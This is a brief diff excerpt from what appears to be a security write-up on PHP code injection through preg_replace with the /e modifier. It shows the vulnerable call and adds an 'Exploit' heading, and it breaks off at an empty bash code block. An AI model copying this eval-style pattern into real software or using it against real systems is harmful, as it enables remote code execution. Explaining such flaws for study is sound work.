@@ -14,6 +14,8 @@ $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
 We can then pass a matching regex inside a file and it will replace the matching content and execute it.
 But we can also break the `preg_replace()` call if it evaluates a bad expression.
 
+## Exploit
+
 Which means that we can do stuff like this: 
 
 ```bash
